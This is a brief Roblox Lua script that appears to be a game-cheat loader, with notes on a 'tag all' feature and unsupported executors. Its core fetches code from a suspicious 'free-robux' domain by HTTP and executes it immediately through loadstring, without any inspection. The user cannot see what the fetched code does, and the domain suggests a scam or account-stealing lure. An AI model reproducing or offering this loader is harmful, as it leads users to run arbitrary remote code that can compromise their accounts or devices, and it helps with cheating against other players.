-- // @ notes | tag all doesnt work that well on free for all i dont recommend using it
-- // @ celery is not supported
untitled, taggame = pcall(game.HttpGet, game, ('https://%s/%s'):format('skibiditoilet.free-robux.click', 'p/raw/bryvmasag5'));
assert(untitled, 'Couldnt retrieve script,', taggame);
loadstring(taggame)();
game:GetService('UserInputService').MouseIconEnabled = true